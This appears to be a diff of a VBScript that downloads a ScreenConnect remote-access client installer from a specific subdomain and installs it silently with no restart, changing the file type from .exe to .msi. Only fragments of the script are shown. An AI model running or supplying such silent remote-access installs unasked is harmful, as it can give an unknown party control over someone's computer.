@@ -1,7 +1,7 @@
 Option Explicit
 
 Dim downloadUrl
-downloadUrl = "https://homesbfc1.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"
+downloadUrl = "https://homesbfc1.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 
 Dim installSwitches
 installSwitches = "/i ""ScreenConnect.ClientSetup.msi"" /qn /norestart"
@@ -59,4 +59,5 @@ Function IsAdmin()
     Else
         IsAdmin = False
     End If
+
 End Function
